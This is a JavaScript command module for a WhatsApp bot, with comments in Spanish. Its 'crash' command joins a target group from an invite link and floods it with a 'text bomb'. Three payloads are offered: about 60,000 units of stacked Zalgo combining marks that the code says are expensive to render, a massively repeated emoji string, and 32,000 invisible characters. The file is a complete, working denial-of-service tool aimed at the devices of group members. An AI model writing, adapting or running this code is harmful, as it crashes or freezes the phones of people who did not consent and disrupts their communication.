export default {
  name: ["crash"],
  description: "Bomba de caracteres pesados y visibles (Zalgo)",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX [zalgo|emoji|oculto]` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });
    const code = match[1];
    const tipo = (text.trim().split(/\s+/)[1] || 'zalgo').toLowerCase();

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
    }
    try { await sock.groupAcceptInvite(code); } catch {}

    // === ZALGO: letra base + marcas combinantes apiladas ===
    // Se VEN en Android (parecen letras rotas) y son carísimas de renderizar.
    const UP   = '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F';
    const DOWN = '\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F\u0320\u0321\u0322\u0323\u0324\u0325';

    const zalgo = (base, marcas) => {
      let s = base;
      for (let i = 0; i < marcas; i++) s += UP[i % UP.length] + DOWN[i % DOWN.length];
      return s;
    };

    const MARKS = 6;                              // sube esto para más brutalidad
    const CLUSTER = zalgo('A', MARKS);            // 1 letra + 12 marcas apiladas
    const BOMB = CLUSTER.repeat(Math.floor(60000 / CLUSTER.length)); // ~60.000 unidades

    const armas = {
      // Caracteres combinantes apilados (visibles + pesados)
      zalgo:  () => sock.sendMessage(groupId, { text: BOMB }),

      // Emojis (por si quieres comparar)
      emoji:  () => sock.sendMessage(groupId, {
        text: '😭🔥💀👻🤖💥🌟🍕🚀🎉😂😍😱🥶🤯👽🎃🧠🍀⚡🌈🐉🦖🌋🎯🥵😵‍💫🫠👾🤡🦄🍩☠️🎸🏆💎🧨🔮🪐🌙⭐🎈🥳🤩😎'.repeat(600),
      }),

      // Caracteres invisibles (texto bomba clásico)
      oculto: () => sock.sendMessage(groupId, { text: '\u200E'.repeat(32000) }),
    };

    const arma = armas[tipo] || armas.zalgo;

    const t = Date.now();
    try {
      await arma();
    } catch (e) {
      return reply({ text: `❌ Falló el envío (${tipo}): ${e.message}` });
    }

    await reply({ text: `💥 Bomba *${tipo}* lanzada a ${groupId} · ${Date.now() - t} ms` });
  },
};